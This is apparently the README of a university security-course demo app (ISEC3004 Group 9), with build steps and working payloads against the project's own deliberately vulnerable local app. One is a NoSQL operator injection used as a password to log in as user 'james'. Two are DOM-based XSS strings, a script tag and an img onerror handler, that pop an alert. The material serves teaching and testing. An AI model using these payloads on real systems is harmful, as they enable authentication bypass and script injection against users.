# ISEC3004 Group 9

### Demo for:

-   NoSQL Injection
-   DOM Based XSS

# For lecturer / testing

### Build:

-   Download and install [Docker](https://www.docker.com/products/docker-desktop/)
-   Run `make -i docker-build`
-   Go to: `http://localhost:8001/`

### NoSQL Injection #1:

Log in as any existing user.

-   Enter `james` as the username
-   Enter `{ "$ne": "" }` as the password

### DOM-Based XSS #1:

-   Enter `asdf<script>alert("Malicious code executed, cookies stolen!");</script>` in the Text to Binary Converter.

### DOM-Based XSS #2:

-   Enter `http://localhost:8000/dom-xss2#Christine Bui"><img src="x" onerror="function f(){alert('Malicious code executed, cookies stolen!');} f()">` into address bar.

# For developers

### Initial setup:

-   Download and install [Docker](https://www.docker.com/products/docker-desktop/)
-   Install node and npm
-   Run `make install`

### Daily dev:

-   Run `make docker-start`
-   Run `make dev`
-   Go to: `http://localhost:8000/`
-   Click `/seed-data` to create dummy data and fake accounts
